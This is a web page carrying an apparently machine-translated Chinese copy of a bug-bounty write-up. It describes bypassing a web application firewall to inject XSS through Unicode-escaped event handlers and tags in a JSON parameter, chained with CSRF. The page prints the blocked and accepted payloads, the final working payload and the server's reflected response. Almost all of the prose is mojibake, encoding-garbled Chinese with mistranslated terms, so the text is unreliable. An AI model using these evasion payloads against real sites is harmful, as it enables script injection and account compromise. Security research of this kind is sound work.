<html>
<head>
<title>Unicode vs WAF â€” XSS WAF Bypass .</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">Unicode vs WAF â€” XSS WAFæ—è·¯ã€‚</h1>
<blockquote>åŸæ–‡ï¼š<a href="https://infosecwriteups.com/unicode-vs-waf-xss-waf-bypass-128cd9972a30?source=collection_archive---------0-----------------------#2019-06-05">https://infosecwriteups.com/unicode-vs-waf-xss-waf-bypass-128cd9972a30?source=collection_archive---------0-----------------------#2019-06-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="cc3c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å—¨ï¼Œè¯»è€…ä»¬ï¼Œ</p><p id="6db8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">åœ¨ç¬¬ä¸€ä¸ª<strong class="jp ir">å¼€æ–‹èŠ‚ï¼Œç©†å·´æ‹‰å…‹</strong>å‘æ‰€æœ‰äººã€‚æ„¿çœŸä¸»åœ¨è¿™ç¥åœ£çš„æ—¶åˆ»å¸¦ç»™ä½ å¿«ä¹ã€å¹¸ç¦ã€å’Œå¹³å’Œç¹è£ã€‚åœ¨è¿™ä¸ªå¿«ä¹çš„å¼€æ–‹èŠ‚ï¼Œç¥ä½ å’Œä½ çš„å®¶äººå¿«ä¹ï¼<strong class="jp ir">T3ã€è‰¾å¾·æ…•ã€‘T4ï¼å› æ­¤ï¼Œåœ¨è¿™ä¸ªç¥åœ£çš„æ—¶åˆ»ï¼Œæˆ‘æƒ³è®©æˆ‘ä»¬åˆ†äº«æˆ‘çš„ä¸€ä¸ªå‘ç°ï¼Œä½œä¸ºå¼€æ–‹èŠ‚çš„å¥–åŠ±ğŸ˜œï¼</strong></p><p id="4744" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ä»æ ‡é¢˜ä¸­ä½ å¯èƒ½çŸ¥é“è¿™æ˜¯ä¸€ç¯‡å…³äºXSSæ™¶ç‰‡æ—è·¯ä½¿ç”¨<strong class="jp ir"> UNICODE </strong>çš„æ–‡ç« ã€‚å› æ­¤ï¼Œè®©æˆ‘ä»¬ç»™ä½ ä¸€ä¸ªå…³äºæˆ‘æ­£åœ¨æµ‹è¯•çš„åº”ç”¨ç¨‹åºçš„å°æƒ³æ³•ã€‚æœ‰ä¸€ä¸ªé€‰é¡¹å«åš<strong class="jp ir">ä¿å­˜ä»¥å¤‡åç”¨</strong>å®ƒä¿å­˜ä½ è´¦æˆ·ä¸­çš„é¡¹ç›®ä»¥å¤‡åç”¨ã€‚è¯¥è¯·æ±‚çœ‹èµ·æ¥åƒæ˜¯:-</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/21f28a0b528069af03fb9eeec211cd5c.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JRmBTYhkldn5BIcAbLrs7A.png"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">æˆ‘ä»¬çš„ç›®æ ‡åº”ç”¨ç¨‹åº<strong class="bd lc">ä¿å­˜ä¸ºä»¥åçš„</strong>é€‰é¡¹è¯·æ±‚</figcaption></figure><p id="6829" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å¦‚æœç”¨æˆ·é€šè¿‡äº†æ­£ç¡®çš„èº«ä»½éªŒè¯ï¼Œé‚£ä¹ˆè¿™ä¸ªpostè¯·æ±‚å°†åœ¨ç”¨æˆ·å¸æˆ·ä¸­ä¿å­˜é¡¹ç›®ä»¥å¤‡åç”¨ï¼Œå¦‚æœç”¨æˆ·æ²¡æœ‰é€šè¿‡æ­£ç¡®çš„èº«ä»½éªŒè¯ï¼Œé‚£ä¹ˆå®ƒå°†åªè¿”å›ä¸€äº›å€¼ã€‚å› æ­¤ï¼Œæˆ‘æ‰‹åŠ¨æ¨¡ç³Šå¤„ç†å‚æ•°ï¼Œå¹¶æ³¨æ„åˆ°<strong class="jp ir">é€šé“</strong>å‚æ•°å€¼åœ¨ç»è¿‡èº«ä»½éªŒè¯çš„&amp;å’Œæœªç»èº«ä»½éªŒè¯çš„åœºæ™¯ä¸­éƒ½åæ˜ åœ¨å“åº”ä½“ä¸­ï¼Œè€Œæ²¡æœ‰æ­£ç¡®è½¬ä¹‰ã€‚æˆ‘å‘é€äº†ä¸€ä¸ªé€šé“å‚æ•°å€¼ç±»ä¼¼äº<strong class="jp ir">" channel ":" XSS \ "&gt;&lt;"</strong>çš„è¯·æ±‚ï¼Œå“åº”æ˜¯:-</p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="0c96" class="li lj iq le b gy lk ll l lm ln">&lt;a class="link nc-text-regular nc-blue js-movetocart" data-giftitemid="&lt;ID&gt;" data-skuid="&lt;ID&gt;" data-itemnumber="&lt;ID&gt;"<br/>                     data-productid="&lt;ID&gt;" data-channel="xss"&gt;&lt;" data-quantity="1"<br/>                     data-isbundleitem="false" role="link" tabindex="0" aria-label="label"&gt;Move to cart&lt;/a&gt;</span></pre><p id="f2fe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æˆ‘ä»¬è¾“å…¥çš„å€¼åœ¨<strong class="jp ir"> <em class="kl"> &lt; a &gt; </em> </strong>æ ‡è®°å†…ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶è½¬ä¹‰ï¼Œå› ä¸º<strong class="jp ir">å¼•å·&amp;å°äº/å¤§äº</strong>ç¬¦å·æ²¡æœ‰è¢«æ­£ç¡®è¿‡æ»¤ã€‚æ‰€ä»¥æˆ‘è®¤ä¸ºæˆ‘æœ‰å¾ˆå¤šæ–¹æ³•åœ¨è¿™é‡ŒåšXSSï¼Œç›´åˆ°æˆ‘è¾“å…¥<strong class="jp ir">" channel ":" XSS \ " onclick = \ " alert(1)"</strong>ï¼Œå¾—åˆ°çš„å›åº”æ˜¯:-</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi km"><img src="../Images/d93a07a39b4cabf8e2db03af9ce99171.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CPRNCl8YQI6Y2-hmy4Qvdw.png"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">WAFï¼WAFï¼WAFï¼ï¼ï¼ğŸ¤•</figcaption></figure><p id="db69" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å› æ­¤æœ‰ä¸€ä¸ªæ™¶ç‰‡åœ¨é€‚å½“ä½ç½®ã€‚ä¸ºäº†ç»•è¿‡å®ƒï¼Œæˆ‘å¼€å§‹æ¨¡ç³Šï¼Œç»“æœæ˜¯:-</p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="6c84" class="li lj iq le b gy lk ll l lm ln">"channel":"xss\"onclick=\"alert(1)" ==&gt; WAF<br/>"channel":"xss\"xss=\"alert(1)" ==&gt; WAF<br/>"channel":"xss\"onclick=\"alert(1)" ==&gt; WAF<br/>"channel":"xss\"xss=\"xxx(1)" ==&gt; No WAF</span></pre><p id="dddd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€ä»¥æˆ‘å°è¯•åˆ›å»ºä¸€ä¸ªæ ‡ç­¾ï¼Œè€Œä¸æ˜¯åœ¨<strong class="jp ir">&lt;&gt;</strong>æ ‡ç­¾ä¸­æ·»åŠ äº‹ä»¶å±æ€§ï¼Œæˆ‘è¾“å…¥<strong class="jp ir">" channel ":" XSS \ "&gt;&lt;XSS&gt;test "</strong>ï¼Œå¾—åˆ°çš„å“åº”æ˜¯:-</p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="24f3" class="li lj iq le b gy lk ll l lm ln">&lt;a class="link nc-text-regular nc-blue js-movetocart" data-giftitemid="&lt;ID&gt;" data-skuid="&lt;ID&gt;" data-itemnumber="&lt;ID&gt;"<br/>                     data-productid="&lt;ID&gt;" data-channel="xss"&gt;test" data-quantity="1"<br/>                     data-isbundleitem="false" role="link" tabindex="0" aria-label="label"&gt;Move to cart&lt;/a&gt;</span></pre><p id="2a9e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€ä»¥å®ƒä¹Ÿåˆ é™¤äº†çœ‹èµ·æ¥åƒæ ‡ç­¾çš„ä¸Šä¸‹æ–‡ã€‚æ‰€ä»¥æˆ‘ä»¬æ²¡æœ‰åˆ›å»ºæ ‡ç­¾çš„ä¼˜åŠ¿ã€‚æ‰€ä»¥æˆ‘ä»¬å”¯ä¸€çš„åŠæ³•å°±æ˜¯ç»•è¿‡WAFä½¿ç”¨<strong class="jp ir">&lt;&gt;</strong>æ ‡ç­¾ä¸­çš„äº‹ä»¶å±æ€§ã€‚æ‰€ä»¥æˆ‘è¯•ç€ç”¨<a class="ae lo" href="https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/xss/html-event-attributes.txt" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">html-event-attributes . txt</strong></a><strong class="jp ir"/>by<a class="ae lo" href="https://github.com/fuzzdb-project/fuzzdb" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">fuzz db</strong></a>åšäº†ä¸€ä¸ªbruteforceï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰äº‹ä»¶æ²¡æœ‰è¢«WAFå±è”½ï¼Œæ²¡æœ‰å¾—åˆ°ä»€ä¹ˆæœ‰è¶£çš„ä¸œè¥¿ã€‚ç„¶åæˆ‘è€ƒè™‘äº†ä¸€ä¸‹unicodeï¼Œè¾“å…¥äº†ä¸€ä¸ªéšæœºçš„unicodeï¼Œçœ‹çœ‹å®ƒæ˜¯å¦èƒ½è§£ç ï¼Œç»“æœå®ƒæŠŠunicodeè§£ç æˆäº†åŸæ¥çš„å­—ç¬¦ã€‚æ‰€ä»¥ç°åœ¨æˆ‘åˆå¼€å§‹ç©<strong class="jp ir"> unicode+events </strong>ï¼Œç»“æœæ˜¯:-</p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="0df1" class="li lj iq le b gy lk ll l lm ln">"channel":"xss\"\u003E\u003Cxss\u003Etest" ==&gt; data-channel="xss"&gt;&lt;xss&gt;test"<br/>"channel":"xss\"xss=\"co\u006efirm(domain)" ==&gt; No WAF<br/>"channel":"xss\"onc\u006Cick=\"co\u006efirm(domain)" ==&gt; HTTP/1.1 403 Forbidden</span></pre><p id="9b6f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ‰€ä»¥æˆ‘ä»¬æœ‰äº†æ–°çš„ä¼˜åŠ¿ï¼Œä¹Ÿæœ‰äº†æ–°çš„é—®é¢˜ã€‚</p><ul class=""><li id="150d" class="lp lq iq jp b jq jr ju jv jy lr kc ls kg lt kk lu lv lw lx bi translated">ä¼˜åŠ¿æ˜¯æˆ‘ä»¬ç°åœ¨å¯ä»¥ä½¿ç”¨unicodesåˆ›å»ºHTMLæ ‡ç­¾ã€‚</li><li id="8cfb" class="lp lq iq jp b jq ly ju lz jy ma kc mb kg mc kk lu lv lw lx bi translated">ç¼ºç‚¹æ˜¯ï¼Œå³ä½¿åœ¨ä½¿ç”¨unicodesä¹‹åï¼Œå½“æˆ‘ä»¬æ·»åŠ ä¸€ä¸ªäº‹ä»¶<strong class="jp ir"> onc\u006Cick </strong>æ—¶ï¼Œæˆ‘ä»¬ä¼šå¾—åˆ°ä¸€ä¸ªæ–°çš„é”™è¯¯<strong class="jp ir"> HTTP/1.1 403 Forbidden </strong>ã€‚</li></ul><p id="4409" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">å› æ­¤ï¼Œæˆ‘å†æ¬¡ä»<a class="ae lo" href="https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/xss/html-event-attributes.txt" rel="noopener ugc nofollow" target="_blank"><strong class="jp ir">html-event-attributes . txt</strong></a><strong class="jp ir">+Unicode</strong>åˆ¶ä½œäº†ä¸€ä¸ªå•è¯è¡¨ï¼Œå¹¶ä¸”æˆ‘å¾—åˆ°äº†<strong class="jp ir">on mous \ u 0045 leave</strong>&amp;<strong class="jp ir">ond \ u 0072 ag</strong>eventsï¼Œç»™å‡ºäº†<strong class="jp ir"> HTTP/1.1 200 OK </strong>ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åˆ›å»ºHTMLæ ‡ç­¾ã€‚æ‰€ä»¥æˆ‘åšäº†æœ€åä¸€æ¬¡è£…è½½</p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="36de" class="li lj iq le b gy lk ll l lm ln">xss\"\u003E\u003Ch1  onmous\u0045leave=co\u006efirm(domain)\u003ECome to Me\u003C/h1\u003E\u003Cbr\u003E\u003C!--</span></pre><p id="97d2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">å“åº”æ­£æ–‡ä¸º:- </strong></p><pre class="kn ko kp kq gt ld le lf lg aw lh bi"><span id="160b" class="li lj iq le b gy lk ll l lm ln">&lt;a class="link nc-text-regular nc-blue js-movetocart" data-giftitemid="&lt;ID&gt;" data-skuid="&lt;ID&gt;" data-itemnumber="&lt;ID&gt;"<br/>                     data-productid="&lt;ID&gt;" data-channel="xss"&gt;&lt;h1  onmouseleave=confirm(domain)&gt;come to me&lt;/h1&gt;&lt;br&gt;&lt;!--" data-quantity="1"<br/>                     data-isbundleitem="false" role="link" tabindex="0" aria-label="label"&gt;Move to cart&lt;/a&gt;</span></pre><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi md"><img src="../Images/809e534a36b044efc9dc5b3c8e1cd883.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ad4FOyZv_m06DHSmEfRXSA.png"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated">æœªç»éªŒè¯çš„ç”¨æˆ·çš„åŸºäºå¸–å­çš„XSS</figcaption></figure><p id="713d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æŠŠé¼ æ ‡æŒ‡é’ˆæ”¾åœ¨<strong class="jp ir">é‡Œï¼Œé è¿‘æˆ‘</strong>ç„¶åç¦»å¼€&amp;åŠæ†ğŸ˜ğŸ¤—</p><p id="9ba6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">ç”±äºè¿™æ˜¯ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œå¹¶ä¸”æ²¡æœ‰CSRFä¿æŠ¤ï¼Œæ‰€ä»¥æˆ‘ä¸ºè®¤è¯ç”¨æˆ·é“¾æ¥äº†<strong class="jp ir"> CSRF + XSS = P2å­˜å‚¨çš„XSS </strong>ğŸ˜ã€‚</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="ks kt di ku bf kv"><div class="gh gi me"><img src="../Images/c76a4ffdcf0fda53c3ce9f4e4a816adc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*p5x0Nx6vJdYVkCgoT6_glA.png"/></div></div><figcaption class="ky kz gj gh gi la lb bd b be z dk translated"><strong class="bd lc"> CSRF + XSS = P2ä¸ºè®¤è¯ç”¨æˆ·å­˜å‚¨XSS </strong>ğŸ˜</figcaption></figure><p id="e6f7" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">æ„Ÿè°¢é˜…è¯»ã€‚çœ‹çœ‹æˆ‘çš„<a class="ae lo" href="https://www.youtube.com/channel/UCaFDPNZiwrzHjaV3rpyP64g" rel="noopener ugc nofollow" target="_blank"> <strong class="jp ir"> YouTubeé¢‘é“</strong> </a>æˆ‘åˆ†äº«çš„ä¸€äº›POCã€‚</p><p id="016b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">è·Ÿæˆ‘æ¥:- </strong></p><div class="mf mg gp gr mh mi"><a href="https://twitter.com/prial261" rel="noopener  ugc nofollow" target="_blank"><div class="mj ab fo"><div class="mk ab ml cl cj mm"><h2 class="bd ir gy z fp mn fr fs mo fu fw ip bi translated">prial Islam (@prial261) | Twitter</h2><div class="mp l"><h3 class="bd b gy z fp mn fr fs mo fu fw dk translated">prial Islamçš„æœ€æ–°æ¨æ–‡(@prial261)ã€‚ä¸€ä¸ªçƒ­è¡·äºç ´åå®‰å…¨çš„å°‘å¹´ğŸ˜‰ğŸ˜‰ğŸ˜‰ã€‚å¸•å¸ƒçº³â€¦</h3></div><div class="mq l"><p class="bd b dl z fp mn fr fs mo fu fw dk translated">twitter.com</p></div></div><div class="mr l"><div class="ms l mt mu mv mr mw kw mi"/></div></div></a></div><div class="mf mg gp gr mh mi"><a href="https://www.facebook.com/prial261" rel="noopener  ugc nofollow" target="_blank"><div class="mj ab fo"><div class="mk ab ml cl cj mm"><h2 class="bd ir gy z fp mn fr fs mo fu fw ip bi translated">æ™®é‡Œé˜¿å‹’Â·ä¼Šæ–¯å…°Â·æ±—</h2><div class="mp l"><h3 class="bd b gy z fp mn fr fs mo fu fw dk translated">Prial Islam Khanåœ¨è„¸ä¹¦ã€‚åŠ å…¥è„¸ä¹¦ï¼Œä¸Prial Islam Khanå’Œæ‚¨å¯èƒ½è®¤è¯†çš„å…¶ä»–äººè”ç³»ã€‚è„¸ä¹¦ç»™â€¦</h3></div><div class="mq l"><p class="bd b dl z fp mn fr fs mo fu fw dk translated">www.facebook.com</p></div></div><div class="mr l"><div class="mx l mt mu mv mr mw kw mi"/></div></div></a></div><p id="b43e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><strong class="jp ir">æ¬¢å‘¼</strong>ğŸ˜‹ğŸ˜‰</p></div></div>    
</body>
</html>